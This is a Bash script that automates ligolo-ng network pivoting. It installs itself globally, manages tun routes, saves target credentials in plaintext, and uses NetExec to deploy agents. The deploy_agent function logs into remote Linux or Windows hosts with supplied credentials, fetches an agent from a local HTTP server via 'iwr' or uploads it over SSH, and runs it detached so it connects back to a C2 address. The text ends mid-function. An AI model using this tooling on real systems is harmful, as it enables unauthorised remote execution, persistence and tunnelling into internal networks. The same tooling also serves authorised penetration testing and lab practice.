#!/bin/bash

# Ligolo UwU v2 - Using nxc --put-file for direct upload
# Usage:
#   ./ligolo-uwu.sh proxy <port>                                        - Start proxy server
#   ./ligolo-uwu.sh route <network>                                     - Add route to ligolo interface
#   ./ligolo-uwu.sh route-del <network>                                 - Remove route from ligolo interface
#   ./ligolo-uwu.sh routes                                              - List all ligolo routes
#   ./ligolo-uwu.sh agent <target_name> [protocol]                      - Deploy to saved target
#   ./ligolo-uwu.sh <ip> <user> <pass> <c2_ip> <c2_port> <protocol> [--local-auth] [--debug] - Quick deploy and save
#   ./ligolo-uwu.sh add <n> <ip> <user> <pass> <c2_ip> <c2_port> <protocol> [--local-auth] [--debug] - Add target and deploy
#   ./ligolo-uwu.sh list                                                 - List saved targets
#   ./ligolo-uwu.sh remove <target_name>                                 - Remove saved target
#   ./ligolo-uwu.sh install                                              - Install globally to /opt
#   ./ligolo-uwu.sh clean                                                - Clean up all lab files and configurations

set -euo pipefail

# Configuration
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly SCRIPT_NAME="$(basename "${BASH_SOURCE[0]}")"
readonly INSTALL_DIR="/opt/ligolo-uwu"
readonly GLOBAL_BIN="/usr/local/bin/ligolo-uwu"

# Determine if we're running from installed location
if [[ "$SCRIPT_DIR" == "/opt/ligolo-uwu" ]]; then
    # Running from installed location
    readonly CONFIG_FILE="${INSTALL_DIR}/.ligolo_targets"
    readonly BINARIES_DIR="${INSTALL_DIR}/ligolo-binaries"
    readonly LOG_FILE="${INSTALL_DIR}/ligolo.log"
    readonly INTERFACE_FILE="${INSTALL_DIR}/.ligolo_interface"
else
    # Running from local directory
    readonly CONFIG_FILE="${SCRIPT_DIR}/.ligolo_targets"
    readonly BINARIES_DIR="${SCRIPT_DIR}/ligolo-binaries"
    readonly LOG_FILE="${SCRIPT_DIR}/ligolo.log"
    readonly INTERFACE_FILE="${SCRIPT_DIR}/.ligolo_interface"
fi

# Colors
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly PURPLE='\033[0;35m'
readonly CYAN='\033[0;36m'
readonly NC='\033[0m'

# Debug mode
DEBUG_MODE=false

# Banner
show_banner() {
    echo -e "${PURPLE}"
    cat << 'EOF'
    ╔══════════════════════════════════════════════════════════╗
    ║                                                          ║
    ║                  Ligolo UwU v2 (◕‿◕)                    ║
    ║               All-in-One Ligolo Manager                 ║
    ║                  Direct Upload Method                   ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# Logging function
log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')

    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"

    case "$level" in
        "ERROR")
            echo -e "${RED}[ERROR]${NC} $message" >&2
            ;;
        "WARN")
            echo -e "${YELLOW}[WARN]${NC} $message"
            ;;
        "INFO")
            echo -e "${GREEN}[INFO]${NC} $message"
            ;;
        "DEBUG")
            if [[ "$DEBUG_MODE" == "true" ]]; then
                echo -e "${BLUE}[DEBUG]${NC} $message"
            fi
            ;;
        *)
            echo "$message"
            ;;
    esac
}

# Error handling
error_exit() {
    log "ERROR" "$1"
    exit 1
}

# Check if running as root
check_root() {
    if [[ $EUID -eq 0 ]]; then
        error_exit "This script should not be run as root. Use your regular user account."
    fi
}

# Check sudo access
check_sudo() {
    if ! sudo -n true 2>/dev/null; then
        log "INFO" "This script requires sudo access for global installation"
        log "INFO" "You may be prompted for your password"
        if ! sudo true; then
            error_exit "Sudo access required for installation"
        fi
    fi
}

# Install globally
install_globally() {
    show_banner
    log "INFO" "Installing Ligolo UwU globally to /opt..."

    check_root
    check_sudo

    # Check if already installed
    if [[ -d "$INSTALL_DIR" ]]; then
        log "WARN" "Ligolo UwU is already installed at $INSTALL_DIR"
        read -p "Reinstall? (y/N): " -n 1 -r
        echo
        if [[ ! $REPLY =~ ^[Yy]$ ]]; then
            log "INFO" "Installation cancelled"
            exit 0
        fi
        log "INFO" "Proceeding with reinstallation..."
        
        # Clean up existing installation
        sudo rm -rf "$INSTALL_DIR"
        sudo rm -f "$GLOBAL_BIN"
    fi

    # Create installation directory
    log "INFO" "Creating installation directory: $INSTALL_DIR"
    sudo mkdir -p "$INSTALL_DIR"

    # Copy script to installation directory
    log "INFO" "Copying script to $INSTALL_DIR"
    sudo cp "$SCRIPT_DIR/$SCRIPT_NAME" "$INSTALL_DIR/"
    sudo chmod +x "$INSTALL_DIR/$SCRIPT_NAME"

    # Create global wrapper
    log "INFO" "Creating global command: ligolo-uwu"
    sudo tee "$GLOBAL_BIN" > /dev/null << EOF
#!/bin/bash
# Ligolo UwU Global Wrapper
# Auto-generated wrapper script
# Installation location: $INSTALL_DIR

# Change to installation directory to ensure relative paths work
cd "$INSTALL_DIR" || exit 1

# Execute the actual script with all arguments
exec "$INSTALL_DIR/$SCRIPT_NAME" "\$@"
EOF

    # Make global command executable
    sudo chmod +x "$GLOBAL_BIN"

    # Set proper ownership for data files (current user should own the data)
    local current_user=$(whoami)
    sudo chown -R "$current_user:$current_user" "$INSTALL_DIR"
    # But keep the script executable by all
    sudo chmod 755 "$INSTALL_DIR/$SCRIPT_NAME"

    # Create uninstall script
    sudo tee "$INSTALL_DIR/uninstall.sh" > /dev/null << 'EOF'
#!/bin/bash
# Ligolo UwU Uninstaller

INSTALL_DIR="/opt/ligolo-uwu"
GLOBAL_BIN="/usr/local/bin/ligolo-uwu"

echo "Uninstalling Ligolo UwU..."

# Remove global command
if [[ -f "$GLOBAL_BIN" ]]; then
    echo "Removing global command: ligolo-uwu"
    sudo rm -f "$GLOBAL_BIN"
fi

# Remove installation directory
if [[ -d "$INSTALL_DIR" ]]; then
    echo "Removing installation directory: $INSTALL_DIR"
    sudo rm -rf "$INSTALL_DIR"
fi

echo "Ligolo UwU uninstalled successfully"
echo "Note: Network routes and tun interfaces may still exist - use 'ligolo-uwu clean' before uninstalling to clean these up"
EOF

    sudo chmod +x "$INSTALL_DIR/uninstall.sh"

    # Update PATH if needed
    if ! echo "$PATH" | grep -q "/usr/local/bin"; then
        log "WARN" "/usr/local/bin is not in your PATH"
        log "INFO" "Add this to your ~/.bashrc or ~/.zshrc:"
        echo -e "${YELLOW}export PATH=\"/usr/local/bin:\$PATH\"${NC}"
    fi

    echo
    echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}            Ligolo UwU Installed Globally! 🎉             ${NC}"
    echo -e "${PURPLE}               Ready for Global Use!                      ${NC}"
    echo ""
    echo -e "  Installation: $INSTALL_DIR"
    echo -e "  Global command: ligolo-uwu"
    echo ""
    echo -e "  ${YELLOW}Test your installation:${NC}"
    echo -e "    ligolo-uwu --help"
    echo -e "    ligolo-uwu download"
    echo -e "    ligolo-uwu proxy 443"
    echo ""
    echo -e "  ${YELLOW}Quick start:${NC}"
    echo -e "    ligolo-uwu download                    # Download binaries"
    echo -e "    ligolo-uwu proxy 443                   # Start proxy"
    echo -e "    ligolo-uwu add WIN01 <ip> <user> <pass> <c2_ip> 443 winrm"
    echo ""
    echo -e "  ${YELLOW}Uninstall anytime:${NC}"
    echo -e "    $INSTALL_DIR/uninstall.sh"
    echo -e "    # or"
    echo -e "    ligolo-uwu clean --uninstall"
    echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
}

# Clean up lab environment
clean_lab() {
    local uninstall_flag="${1:-}"
    
    show_banner
    log "INFO" "Cleaning up Ligolo UwU lab environment..."

    echo -e "${YELLOW}This will clean up:${NC}"
    echo "• All ligolo network routes"
    echo "• Ligolo tun interface"
    echo "• Saved target configurations"
    echo "• Downloaded binaries"
    echo "• Log files"
    echo "• Temporary files"
    if [[ "$uninstall_flag" == "--uninstall" ]]; then
        echo "• Global installation (uninstall)"
    fi
    echo

    read -p "Are you sure you want to clean up? (y/N): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        log "INFO" "Cleanup cancelled"
        exit 0
    fi

    # Clean up network routes
    log "INFO" "Removing ligolo routes..."
    local routes=$(ip route show | grep ligolo || true)
    if [[ -n "$routes" ]]; then
        echo "$routes" | while read -r route; do
            local network=$(echo "$route" | awk '{print $1}')
            if [[ -n "$network" && "$network" != "dev" ]]; then
                log "INFO" "Removing route: $network"
                sudo ip route del "$network" dev ligolo 2>/dev/null || true
            fi
        done
        log "INFO" "✓ Routes removed"
    else
        log "INFO" "No ligolo routes found"
    fi

    # Remove ligolo interface
    log "INFO" "Removing ligolo tun interface..."
    if ip link show ligolo &>/dev/null; then
        sudo ip link delete ligolo 2>/dev/null || true
        log "INFO" "✓ Ligolo interface removed"
    else
        log "INFO" "No ligolo interface found"
    fi

    # Determine the correct directories to clean
    local config_dir="$SCRIPT_DIR"
    if [[ "$SCRIPT_DIR" == "/opt/ligolo-uwu" ]]; then
        config_dir="$INSTALL_DIR"
    fi

    # Clean up configuration files
    log "INFO" "Removing configuration files..."
    local files_removed=0
    
    if [[ -f "${config_dir}/.ligolo_targets" ]]; then
        rm -f "${config_dir}/.ligolo_targets"
        ((files_removed++))
        log "INFO" "✓ Removed saved targets"
    fi
    
    if [[ -f "${config_dir}/.ligolo_interface" ]]; then
        rm -f "${config_dir}/.ligolo_interface"
        ((files_removed++))
        log "INFO" "✓ Removed interface configuration"
    fi
    
    if [[ -f "${config_dir}/ligolo.log" ]]; then
        rm -f "${config_dir}/ligolo.log"
        ((files_removed++))
        log "INFO" "✓ Removed log file"
    fi

    # Clean up binaries
    if [[ -d "${config_dir}/ligolo-binaries" ]]; then
        rm -rf "${config_dir}/ligolo-binaries"
        ((files_removed++))
        log "INFO" "✓ Removed downloaded binaries"
    fi

    # Clean up any temporary files
    local temp_files=$(find /tmp -name "ligolo-*" 2>/dev/null || true)
    if [[ -n "$temp_files" ]]; then
        echo "$temp_files" | xargs rm -f 2>/dev/null || true
        log "INFO" "✓ Removed temporary files"
        ((files_removed++))
    fi

    # Kill any remaining python web servers (if running)
    local web_servers=$(pgrep -f "python.*http.server" || true)
    if [[ -n "$web_servers" ]]; then
        echo "$web_servers" | xargs kill 2>/dev/null || true
        log "INFO" "✓ Stopped any running web servers"
    fi

    # Uninstall if requested
    if [[ "$uninstall_flag" == "--uninstall" ]]; then
        if [[ -f "$INSTALL_DIR/uninstall.sh" ]]; then
            log "INFO" "Running uninstaller..."
            sudo bash "$INSTALL_DIR/uninstall.sh"
        else
            log "WARN" "Uninstaller not found, performing manual cleanup..."
            # Manual cleanup
            if [[ -f "$GLOBAL_BIN" ]]; then
                sudo rm -f "$GLOBAL_BIN"
                log "INFO" "✓ Removed global command"
            fi
            if [[ -d "$INSTALL_DIR" ]]; then
                sudo rm -rf "$INSTALL_DIR"
                log "INFO" "✓ Removed installation directory"
            fi
        fi
    fi

    echo
    echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}                Lab Environment Cleaned! 🧹               ${NC}"
    echo ""
    echo -e "  ${GREEN}✓${NC} Network routes removed"
    echo -e "  ${GREEN}✓${NC} Ligolo interface removed"
    echo -e "  ${GREEN}✓${NC} Configuration files cleaned ($files_removed files)"
    echo -e "  ${GREEN}✓${NC} Temporary files removed"
    if [[ "$uninstall_flag" == "--uninstall" ]]; then
    echo -e "  ${GREEN}✓${NC} Global installation removed"
    fi
    echo ""
    echo -e "  ${YELLOW}Your system is now clean and ready for fresh setup${NC}"
    if [[ "$uninstall_flag" != "--uninstall" ]]; then
    echo -e "  ${YELLOW}To reinstall globally: ligolo-uwu install${NC}"
    fi
    echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
}

# Check dependencies
check_dependencies() {
    local deps=("curl" "wget" "tar" "unzip")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done

    if [[ ${#missing[@]} -gt 0 ]]; then
        error_exit "Missing dependencies: ${missing[*]}. Please install them first."
    fi

    # Check for NetExec
    if ! command -v nxc &> /dev/null; then
        error_exit "NetExec (nxc) is required. Install with: pip3 install netexec"
    fi
}

# Download latest ligolo binaries
download_ligolo() {
    log "INFO" "Downloading latest ligolo-ng binaries..."

    mkdir -p "$BINARIES_DIR"

    # Get latest release info
    local api_url="https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest"
    local latest_info

    if ! latest_info=$(curl -s "$api_url"); then
        error_exit "Failed to fetch latest release information"
    fi

    local latest_tag=$(echo "$latest_info" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')

    if [[ -z "$latest_tag" ]]; then
        error_exit "Could not determine latest version"
    fi

    log "INFO" "Latest version: $latest_tag"

    # Download URLs
    local base_url="https://github.com/nicocha30/ligolo-ng/releases/download/${latest_tag}"
    local proxy_url="${base_url}/ligolo-ng_proxy_${latest_tag#v}_linux_amd64.tar.gz"
    local agent_linux_url="${base_url}/ligolo-ng_agent_${latest_tag#v}_linux_amd64.tar.gz"
    local agent_windows_url="${base_url}/ligolo-ng_agent_${latest_tag#v}_windows_amd64.zip"

    # Download proxy
    log "INFO" "Downloading proxy..."
    if wget -q "$proxy_url" -O "/tmp/ligolo-proxy.tar.gz"; then
        tar -xzf "/tmp/ligolo-proxy.tar.gz" -C "/tmp/"
        mv "/tmp/proxy" "${BINARIES_DIR}/ligolo-proxy"
        chmod +x "${BINARIES_DIR}/ligolo-proxy"
        log "INFO" "✓ Proxy downloaded successfully"
    else
        error_exit "Failed to download proxy"
    fi

    # Download Linux agent
    log "INFO" "Downloading Linux agent..."
    if wget -q "$agent_linux_url" -O "/tmp/ligolo-agent-linux.tar.gz"; then
        tar -xzf "/tmp/ligolo-agent-linux.tar.gz" -C "/tmp/"
        mv "/tmp/agent" "${BINARIES_DIR}/agent-linux"
        chmod +x "${BINARIES_DIR}/agent-linux"
        log "INFO" "✓ Linux agent downloaded successfully"
    else
        log "WARN" "Failed to download Linux agent"
    fi

    # Download Windows agent
    log "INFO" "Downloading Windows agent..."
    if wget -q "$agent_windows_url" -O "/tmp/ligolo-agent-windows.zip"; then
        unzip -q "/tmp/ligolo-agent-windows.zip" -d "/tmp/"
        mv "/tmp/agent.exe" "${BINARIES_DIR}/agent-windows.exe"
        log "INFO" "✓ Windows agent downloaded successfully"
    else
        log "WARN" "Failed to download Windows agent"
    fi

    # Cleanup
    rm -f "/tmp/ligolo-"*

    log "INFO" "All binaries downloaded to: $BINARIES_DIR"
}

# Get configured interface IP
get_interface_ip() {
    local interface=""

    # Check if interface is saved
    if [[ -f "$INTERFACE_FILE" ]]; then
        interface=$(cat "$INTERFACE_FILE")
    fi

    if [[ -n "$interface" ]]; then
        # Get IP from specified interface
        local ip=$(ip -4 addr show "$interface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
        if [[ -n "$ip" ]]; then
            echo "$ip"
            return 0
        else
            log "WARN" "Could not get IP from interface $interface, falling back to auto-detection"
        fi
    fi

    # Fallback to auto-detection
    return 1
}

# Ensure binaries exist
ensure_binaries() {
    if [[ ! -f "${BINARIES_DIR}/ligolo-proxy" ]]; then
        log "INFO" "Ligolo binaries not found. Downloading..."
        download_ligolo
    fi
}

# Save target configuration
save_target() {
    local name="$1"
    local ip="$2"
    local user="$3"
    local pass="$4"
    local c2_ip="$5"
    local c2_port="$6"
    local protocol="$7"
    local local_auth="${8:-false}"

    # Remove existing entry if it exists
    if [[ -f "$CONFIG_FILE" ]]; then
        grep -v "^${name}:" "$CONFIG_FILE" > "${CONFIG_FILE}.tmp" 2>/dev/null || true
        mv "${CONFIG_FILE}.tmp" "$CONFIG_FILE" 2>/dev/null || true
    fi

    # Add new entry
    echo "${name}:${ip}:${user}:${pass}:${c2_ip}:${c2_port}:${protocol}:${local_auth}" >> "$CONFIG_FILE"
    log "INFO" "Target $name saved successfully"
}

# Load target configuration
load_target() {
    local name="$1"

    if [[ ! -f "$CONFIG_FILE" ]]; then
        error_exit "No saved targets found"
    fi

    local line=$(grep "^${name}:" "$CONFIG_FILE" 2>/dev/null || true)

    if [[ -z "$line" ]]; then
        error_exit "Target $name not found in saved targets"
    fi

    # Parse the line - handle both old format (7 fields) and new format (8 fields)
    IFS=':' read -r TARGET_NAME TARGET_IP TARGET_USER TARGET_PASS TARGET_C2_IP TARGET_C2_PORT TARGET_PROTOCOL TARGET_LOCAL_AUTH <<< "$line"

    # Default local_auth to false if not present (backward compatibility)
    TARGET_LOCAL_AUTH="${TARGET_LOCAL_AUTH:-false}"

    log "INFO" "Loaded target: $TARGET_NAME ($TARGET_IP)"
}

# Add route to ligolo interface
add_route() {
    local network="$1"

    # Validate network format
    if [[ ! "$network" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        error_exit "Invalid network format. Use IP address like: 172.16.70.0"
    fi

    # Auto-detect subnet mask based on private network ranges
    local subnet_mask="/24"
    if [[ "$network" =~ ^10\. ]]; then
        subnet_mask="/24"  # Default to /24 for 10.x networks
    elif [[ "$network" =~ ^172\.(1[6-9]|2[0-9]|3[01])\. ]]; then
        subnet_mask="/24"  # Default to /24 for 172.16-31.x networks
    elif [[ "$network" =~ ^192\.168\. ]]; then
        subnet_mask="/24"  # Default to /24 for 192.168.x networks
    fi

    # If user provided CIDR notation, use it
    if [[ "$network" =~ ^([0-9.]+)/([0-9]+)$ ]]; then
        local ip_part="${BASH_REMATCH[1]}"
        local cidr_part="${BASH_REMATCH[2]}"
        network="$ip_part"
        subnet_mask="/$cidr_part"
    fi

    local full_network="${network}${subnet_mask}"

    log "INFO" "Adding route for network: $full_network"

    # Check if ligolo interface exists
    if ! ip link show ligolo &>/dev/null; then
        log "WARN" "Ligolo interface not found. Creating it..."

        # Get the actual username (even when run with sudo)
        local actual_user="${SUDO_USER:-$(whoami)}"

        if ! sudo ip tuntap add user "$actual_user" mode tun ligolo; then
            error_exit "Failed to create ligolo tun interface"
        fi

        if ! sudo ip link set ligolo up; then
            error_exit "Failed to bring ligolo interface up"
        fi

        log "INFO" "✓ ligolo interface created and brought up"
    fi

    # Check if route already exists
    if ip route show | grep -q "$full_network.*ligolo"; then
        log "WARN" "Route for $full_network already exists"
        echo -e "${YELLOW}Current route:${NC}"
        ip route show | grep "$full_network.*ligolo"

        read -p "Replace existing route? (y/N): " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            log "INFO" "Removing existing route..."
            sudo ip route del "$full_network" dev ligolo 2>/dev/null || true
        else
            log "INFO" "Keeping existing route"
            return 0
        fi
    fi

    # Add the route
    log "INFO" "Adding route: $full_network via ligolo interface"
    if sudo ip route add "$full_network" dev ligolo; then
        log "INFO" "✓ Route added successfully"

        echo
        echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}                    Route Added! 🛣️                       ${NC}"
        echo -e "${PURPLE}                  Network Accessible                      ${NC}"
        echo ""
        echo -e "  Network: $full_network"
        echo -e "  Interface: ligolo"
        echo -e "  Status: Active"
        echo ""
        echo -e "  ${YELLOW}Verify route:${NC}"
        echo -e "    ip route show | grep ligolo"
        echo -e "    ping ${network%.*}.1  # Test gateway"
        echo ""
        echo -e "  ${YELLOW}Remove route:${NC}"
        echo -e "    ligolo-uwu route-del $network"
        echo -e "${GREEN}══════════════════════════════════════════════════════════${NC}"

    else
        error_exit "Failed to add route for $full_network"
    fi
}

# Remove route from ligolo interface
remove_route() {
    local network="$1"

    # Validate network format
    if [[ ! "$network" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        error_exit "Invalid network format. Use IP address like: 172.16.70.0"
    fi

    # Auto-detect subnet mask or use provided CIDR
    local subnet_mask="/24"
    if [[ "$network" =~ ^([0-9.]+)/([0-9]+)$ ]]; then
        local ip_part="${BASH_REMATCH[1]}"
        local cidr_part="${BASH_REMATCH[2]}"
        network="$ip_part"
        subnet_mask="/$cidr_part"
    fi

    local full_network="${network}${subnet_mask}"

    log "INFO" "Removing route for network: $full_network"

    # Check if route exists
    if ! ip route show | grep -q "$full_network.*ligolo"; then
        log "WARN" "Route for $full_network not found"
        echo -e "${YELLOW}Current ligolo routes:${NC}"
        ip route show | grep ligolo || echo "  (none)"
        return 0
    fi

    # Remove the route
    if sudo ip route del "$full_network" dev ligolo; then
        log "INFO" "✓ Route removed successfully"

        echo -e "${GREEN}Route for $full_network removed from ligolo interface${NC}"
    else
        error_exit "Failed to remove route for $full_network"
    fi
}

# List all ligolo routes
list_routes() {
    echo -e "${BLUE}Ligolo Routes:${NC}"
    echo "=============="

    local routes=$(ip route show | grep ligolo || true)

    if [[ -z "$routes" ]]; then
        echo "No ligolo routes found"
        echo ""
        echo -e "${YELLOW}Add a route with:${NC} ligolo-uwu route <network>"
        echo -e "${YELLOW}Example:${NC} ligolo-uwu route 172.16.70.0"
    else
        echo "$routes"
        echo ""
        echo -e "${YELLOW}Remove a route with:${NC} ligolo-uwu route-del <network>"
    fi

    # Show interface status
    echo ""
    if ip link show ligolo &>/dev/null; then
        local status=$(ip link show ligolo | grep -o "state [A-Z]*" | cut -d' ' -f2)
        echo -e "${BLUE}Ligolo Interface:${NC} $status"
    else
        echo -e "${RED}Ligolo Interface:${NC} Not found"
    fi
}

# Start ligolo proxy
start_proxy() {
    local port="$1"
    local interface="${2:-}"

    ensure_binaries

    if [[ ! -f "${BINARIES_DIR}/ligolo-proxy" ]]; then
        error_exit "Ligolo proxy binary not found. Try running with 'download' first."
    fi

    # Save interface if provided
    if [[ -n "$interface" ]]; then
        # Verify interface exists
        if ! ip link show "$interface" &>/dev/null; then
            error_exit "Interface $interface does not exist"
        fi

        # Get IP from interface to verify it has an IP
        local interface_ip=$(ip -4 addr show "$interface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1)
        if [[ -z "$interface_ip" ]]; then
            error_exit "Interface $interface has no IPv4 address"
        fi

        echo "$interface" > "$INTERFACE_FILE"
        log "INFO" "Saved interface: $interface (IP: $interface_ip)"
        log "INFO" "All future deployments will use IP: $interface_ip"
    else
        # Clear saved interface
        rm -f "$INTERFACE_FILE"
        log "INFO" "No interface specified, will auto-detect for deployments"
    fi

    # Setup tun interface
    log "INFO" "Setting up ligolo tun interface..."

    # Check if ligolo interface already exists
    if ! ip link show ligolo &>/dev/null; then
        log "INFO" "Creating ligolo tun interface..."

        # Get the actual username (even when run with sudo)
        local actual_user="${SUDO_USER:-$(whoami)}"

        if ! sudo ip tuntap add user "$actual_user" mode tun ligolo; then
            error_exit "Failed to create ligolo tun interface. Make sure you have sudo privileges."
        fi
        log "INFO" "✓ ligolo tun interface created for user $actual_user"
    else
        log "INFO" "✓ ligolo tun interface already exists"
    fi

    # Bring interface up
    log "INFO" "Bringing ligolo interface up..."
    if ! sudo ip link set ligolo up; then
        error_exit "Failed to bring ligolo interface up"
    fi
    log "INFO" "✓ ligolo interface is up"

    log "INFO" "Starting ligolo proxy on port $port..."
    echo
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════╗"
    echo -e "║                   Ligolo Proxy Started                  ║"
    echo -e "║                                                          ║"
    echo -e "║  Listening on: 0.0.0.0:$port                            ║"
    echo -e "║  Tun interface: ligolo (ready)                          ║"
    if [[ -n "$interface" ]]; then
    echo -e "║  Using interface: $interface ($interface_ip)             ║"
    fi
    echo -e "║  Press Ctrl+C to stop                                   ║"
    echo -e "╚══════════════════════════════════════════════════════════╝${NC}"
    echo

    # Start the proxy
    exec "${BINARIES_DIR}/ligolo-proxy" -selfcert -laddr "0.0.0.0:$port"
}

# Deploy agent to target
deploy_agent() {
    local ip="$1"
    local user="$2"
    local pass="$3"
    local c2_ip="$4"
    local c2_port="$5"
    local protocol="$6"
    local local_auth="${7:-false}"

    log "INFO" "Deploying agent to $ip using $protocol"
    if [[ "$local_auth" == "true" ]]; then
        log "INFO" "Using local authentication"
    fi

    local agent_file local_auth_flag=""

    # Set local auth flag if needed
    if [[ "$local_auth" == "true" && ("$protocol" == "smb" || "$protocol" == "winrm") ]]; then
        local_auth_flag="--local-auth"
    fi

    # Determine agent and paths based on protocol
    if [[ "$protocol" == "ssh" ]]; then
        agent_file="${BINARIES_DIR}/agent-linux"
        local remote_path="/tmp/agent"

        # Check if agent file exists
        if [[ ! -f "$agent_file" ]]; then
            log "ERROR" "Agent file not found: $agent_file"
            log "INFO" "Run: ligolo-uwu download"
            error_exit "Missing agent binary"
        fi

        # Upload agent using nxc for SSH
        log "INFO" "Uploading agent to $ip..."
        if ! nxc "$protocol" "$ip" -u "$user" -p "$pass" --put-file "$agent_file" "$remote_path" > /dev/null 2>&1; then
            error_exit "Failed to upload agent to $ip"
        fi

        # Execute agent
        log "INFO" "Starting agent on $ip..."
        local exec_cmd="sh -c 'chmod +x /tmp/agent && setsid nohup /tmp/agent -connect $c2_ip:$c2_port -ignore-cert >/dev/null 2>&1 < /dev/null &'"

        if ! nxc "$protocol" "$ip" -u "$user" -p "$pass" -x "$exec_cmd" &>/dev/null; then
            error_exit "Failed to start agent on $ip"
        fi

    else
        # Windows (winrm/smb) - Both use the same approach now
        agent_file="${BINARIES_DIR}/agent-windows.exe"

        # Check if agent file exists
        if [[ ! -f "$agent_file" ]]; then
            log "ERROR" "Agent file not found: $agent_file"
            log "INFO" "Run: ligolo-uwu download"
            error_exit "Missing agent binary"
        fi

        # Start web server for agent download
        log "INFO" "Starting web server for agent download..."

        # Get local IP - prefer configured interface
        local local_ip=$(get_interface_ip)
        if [[ -z "$local_ip" ]]; then
            # Fallback to route-based detection
            local_ip=$(ip route get "$ip" | grep -oP 'src \K[^ ]+' | head -1)
            if [[ -z "$local_ip" ]]; then
                local_ip="$c2_ip"
            fi
        else
            if [[ "$DEBUG_MODE" == "true" && -f "$INTERFACE_FILE" ]]; then
                log "DEBUG" "Using saved interface: $(cat "$INTERFACE_FILE")"
            fi
        fi

        log "INFO" "Using IP: $local_ip for agent download"

        # Start simple HTTP server
        cd "$BINARIES_DIR"
        python3 -m http.server 8888 &>/dev/null &
        local web_pid=$!
        sleep 2

        log "INFO" "Downloading agent to target..."
        log "DEBUG" "Download URL: http://$local_ip:8888/agent-windows.exe"

        # Build the path based on the username - properly escape backslashes
        local desktop_path="c:\\\\users\\\\${user}\\\\desktop\\\\agent.exe"

        # Download command - both protocols use PowerShell with uppercase -X
        local download_cmd="iwr http://${local_ip}:8888/agent-windows.exe -o ${desktop_path}"
        local cmd_flag="-X"
        local exec_method=""

        if [[ "$protocol" == "smb" ]]; then
            # SMB needs --exec-method smbexec for download
            exec_method="--exec-method smbexec"
        fi

        if [[ "$DEBUG_MODE" == "true" ]]; then
            log "DEBUG" "Running: nxc $protocol $ip -u $user -p [REDACTED] $local_auth_flag $cmd_flag \"$download_cmd\" $exec_method"
        fi

        # First try with local auth flag if set
        local download_output
        if [[ "$DEBUG_MODE" == "true" ]]; then
            download_output=$(nxc "$protocol" "$ip" -u "$user" -p "$pass" $local_auth_flag $cmd_flag "$download_cmd" $exec_method 2>&1)
            local download_status=$?
            if [[ $download_status -ne 0 ]]; then
                log "DEBUG" "Download command output: $download_output"
            fi
        else
            download_output=$(nxc "$protocol" "$ip" -u "$user" -p "$pass" $local_auth_flag $cmd_flag "$download_cmd" $exec_method 2>&1)
            local download_status=$?
        fi

        if [[ $download_status -ne 0 ]]; then
            # If local auth failed, try without it (domain auth)
            if [[ -n "$local_auth_flag" ]]; then
                log "WARN" "Local auth failed, trying domain authentication..."
                if [[ "$DEBUG_MODE" == "true" ]]; then
                    download_output=$(nxc "$protocol" "$ip" -u "$user" -p "$pass" $cmd_flag "$download_cmd" $exec_method 2>&1)
                    local download_status=$?
                    if [[ $download_status -ne 0 ]]; then
                        log "DEBUG" "Domain auth output: $download_output"
                    fi
                else
                    download_output=$(nxc "$protocol" "$ip" -u "$user" -p "$pass" $cmd_flag "$download_cmd" $exec_method 2>&1)
                    local download_status=$?
                fi

                if [[ $download_status -ne 0 ]]; then
                    kill "$web_pid" 2>/dev/null || true
                    cd - &>/dev/null
                    error_exit "Failed to download agent to $ip with both local and domain auth"
                fi
                # Domain auth worked, clear the flag for execution
                local_auth_flag=""
            else
                kill "$web_pid" 2>/dev/null || true
                cd - &>/dev/null
                if [[ "$DEBUG_MODE" == "true" ]]; then
                    log "DEBUG" "Download failed with output: $download_output"
                fi
                error_exit "Failed to download agent to $ip"
            fi
        fi

        # Stop web server
        kill "$web_pid" 2>/dev/null || true
        cd - &>/dev/null

        log "INFO" "✓ Agent downloaded"

        # Execute agent - same command for both WinRM and SMB
        log "INFO" "Starting agent..."
        # Build the path based on the username - use single backslashes for execution
        local agent_path="c:\\users\\${user}\\desktop\\agent.exe"

        # For execution, set the correct command and flags based on protocol
        # Don't include quotes in the command itself
        local exec_cmd="${agent_path} -connect ${c2_ip}:${c2_port} -ignore-cert"
        local exec_flag="-X"
        local exec_method=""

        if [[ "$protocol" == "smb" ]]; then
            # SMB needs lowercase -x and --exec-method smbexec
            exec_flag="-x"
            exec_method="--exec-method smbexec"
        fi

        if [[ "$DEBUG_MODE" == "true" ]]; then
            log "DEBUG" "Running: nxc $protocol $ip -u $user -p [REDACTED] $local_auth_flag $exec_flag '${exec_cmd}' $exec_method"
        fi

        # Use timeout since agent runs continuously
        local exec_output
        if [[ "$DEBUG_MODE" == "true" ]]; then
            log "DEBUG" "Executing agent command..."

            # Show the exact command being run
            echo "[DEBUG] Exact command being executed:"
            echo "nxc $protocol $ip -u $user -p ****** $local_auth_flag $exec_flag '${exec_cmd}' $exec_method"

            # Run it and show output in real-time
            log "DEBUG" "Running command (will timeout after 10 seconds)..."

            # Run the command exactly as it works manually - with single quotes
